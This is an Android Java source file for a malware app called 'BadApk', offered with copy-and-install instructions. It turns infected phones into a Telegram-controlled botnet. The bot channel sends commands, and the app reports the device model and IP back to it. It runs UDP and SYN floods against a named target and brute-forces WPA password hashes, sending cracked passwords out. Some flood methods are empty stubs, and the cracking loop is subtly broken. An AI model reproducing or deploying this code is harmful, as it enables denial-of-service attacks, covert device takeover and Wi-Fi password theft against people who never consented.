/*
 ReadMe now :P

 1) add follow permission at your AndroidManifest.xml
 <uses-permission android:name="android.permission.INTERNET" />
 <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
 <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />

 2) you are only need copy follow class from here: BadApk(main), Network(service), Device(service).

 3) control /info /ddos victim.com /brute <hashWpa> <essid> <fileNameInYourChannel>
 */

package com.example.badapk;

import android.Manifest;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.NetworkInterface;
import java.net.Socket;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.util.Arrays;
import java.util.Enumeration;
import java.util.Objects;
import java.util.Random;

import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.PBEKeySpec;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLSocketFactory;

public class MainActivity extends AppCompatActivity{

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Thread main = new Thread() {
            @Override
            public void run() {
                try {

                    // permissions
                    ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.INTERNET}, 1);

                    // main exec
                    BadApk.start();

                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        };
        main.start();
    }
}

class BadApk {
    static String telegramApi = "https://api.telegram.org/" + "bot1111111111:aaaaaaaaaaaaaaaaaaaaa-__fffffffffff", botName = "botName";
    static NetWare netWare = new NetWare();
    static HardWare hardWare = new HardWare();

    public static void start() {
        try {

            // get last msg from telegram
            String[] data = netWare.connHttps(telegramApi + "/getUpdates");

            //parse (/result/[]/message/text)
            data = netWare.parse(data, "result");
            data = netWare.parse(data, "message");
            String[] array = new String[] {data[data.length - 1]};
            data = netWare.parse(array, "text");

            //get cmd, args
            String[] cmd = (data[0].split("/")[1]).split("@")[0].split(" ");

            //call
            switch (cmd[0]) {
                case "info":
                    // 10k geo parts (active bots)
                    // equals geo part
                    // skip firstly parts

                    // we have words/bots
                    netWare.connHttps(telegramApi + "/sendMessage?chat_id=@" + botName + "&text=" + hardWare.name() +"_"+ hardWare.ip() +"_"+ hardWare.geo());
                    break;
                case "ddos":
                    if (!Objects.equals(cmd[1], "")) {
                        netWare.httpFlood(cmd[1]);
                        netWare.httpsFlood(cmd[1]);
                        netWare.udpFlood(cmd[1]);
                        netWare.icmpFlood(cmd[1]);
                        netWare.synFlood(cmd[1]);
                    }
                    break;
                case "brute":
                    // hash, essid(as salt), wordlistName, skipWordsAtWordlist(for dedicated between bots)
                    String pass = hardWare.brute(cmd[1], cmd[2], Arrays.toString(netWare.connHttps(telegramApi + cmd[3])), String.valueOf(new Random().nextInt(100000000)));
                    if (!Objects.equals(pass, "")) netWare.connHttps(telegramApi + "/sendMessage?chat_id=@" + botName + "&text=" + pass);
                    break;
                case "stop":
                    // exit app
                    break;
            }
        } catch (Exception e) { Log.d("badApk.start", String.valueOf(e)); }
    }
}


class NetWare {
    // accept url
    // return document
    public String[] connHttps(String url) {
        try {
            //request
            SSLSocketFactory sslSocketFactory = (SSLSocketFactory) SSLSocketFactory.getDefault();
            HttpsURLConnection con = (HttpsURLConnection) new URL(url).openConnection();
            con.setSSLSocketFactory(sslSocketFactory);
            con.setRequestMethod("GET");
            //response
            BufferedReader br = new BufferedReader(new InputStreamReader((InputStream) con.getContent()));
            String input;
            String[] data = new String[]{""};
            while ((input = br.readLine()) != null) {
                data[0] = data[0] + input;
            }
            br.close();
            return data;
        } catch (IOException e) {
            e.printStackTrace();
        }
        return new String[]{};
    }

    // accept document, json key
    // return content as array
    public String[] parse(String[] data, String key) {
        try {
            // if clear json
            if (Objects.equals(data[0].split("\\{", 2)[0], "")) {
                String[] parsed = new String[]{""};
                parsed[0] = String.valueOf(new JSONObject(data[0]).get(key));
                return parsed;
            }
            // if array
            // String[] to jsonArray to jsonObj to String[(by key)]
            if (Objects.equals(data[0].split("\\[", 2)[0], "")) {
                JSONArray jsonArray = new JSONArray(data[0]);
                String[] parsed = new String[jsonArray.length()];
                for (int i = 0; i < jsonArray.length(); i++) {
                    parsed[i] = String.valueOf(new JSONObject(String.valueOf(jsonArray.getJSONObject(i))).get(key));
                }
                return parsed;
            }
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return new String[]{};
    }

    public void httpFlood(String url) {

    }

    public void httpsFlood(String url) {
    }

    public void udpFlood(String url) {
        try {

            byte[] buf = new byte[65507];
            new SecureRandom().nextBytes(buf);
            new DatagramSocket().send(new DatagramPacket(buf, buf.length, InetAddress.getByName(url), 80));

        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void icmpFlood(String url) {
    }

    public void synFlood(String url) {
        for (int packets = 1; packets < 1000; packets++) {
            Thread thread = new Thread() {
                public void run() {
                    Socket socket = new Socket();
                    try {
                        socket.connect(new InetSocketAddress("https://" + url, Integer.parseInt("443")), 2500);
                        sleep(100);
                        socket.close();
                    } catch (IOException | InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            };
            thread.start();
        }
    }
}


class HardWare{

    public String ip() {
        try {
            Enumeration<NetworkInterface> networkInterfaceEnumeration = NetworkInterface.getNetworkInterfaces();
            while( networkInterfaceEnumeration.hasMoreElements() )
            {
                NetworkInterface networkInterface = networkInterfaceEnumeration.nextElement();
                Enumeration<InetAddress> addresses = networkInterface.getInetAddresses();

                while( addresses.hasMoreElements() )
                {
                    InetAddress inetAddress = addresses.nextElement();
                    if( inetAddress instanceof Inet4Address && !inetAddress.isLoopbackAddress() )
                    {
                        return String.valueOf(inetAddress);
                    }
                }
            }
        } catch (Exception e) { e.printStackTrace(); }
        return "";
    }

    public String mac() {
        try {
            byte[] mac = NetworkInterface.getByInetAddress(InetAddress.getLocalHost()).getHardwareAddress();
            StringBuilder sb = new StringBuilder();

            for (int i = 0; i < mac.length; i++) {
                sb.append(String.format("%02X%s", mac[i], (i < mac.length - 1) ? "-" : ""));
            }
            return sb.toString();

        } catch (Exception e) { Log.d("hardware.mac", String.valueOf(e)); }
        return "";
    }

    public String name() {
        return android.os.Build.MODEL;
    }

    public String geo() {
        return "";
    }

    // accept hash, essid (as salt), plain passwords, offset
    // return password
    public String brute(String hash, String essid, String wordlist, String skip){
        final String PBKDF2_ALGORITHM = "PBKDF2WithHmacSHA1";
        final int SALT_BYTES = 24;
        final int HASH_BYTES = 24;
        final int PBKDF2_ITERATIONS = 1000;

        try {
            // get passwords
            String[] words = wordlist.split("\n");

            // generate hash
            for (int i = Integer.parseInt(skip); i < i+15000; i++) {
                PBEKeySpec spec = new PBEKeySpec(words[0].toCharArray(), essid.getBytes(StandardCharsets.UTF_8), PBKDF2_ITERATIONS, HASH_BYTES * 8);
                SecretKeyFactory skf = SecretKeyFactory.getInstance(PBKDF2_ALGORITHM);

                // compare hash's
                if (hash.equals(Arrays.toString(skf.generateSecret(spec).getEncoded()))) return words[i];
            }
        } catch (Exception e){ Log.d("hardware.brute", String.valueOf(e)); }
        return "";
    }
}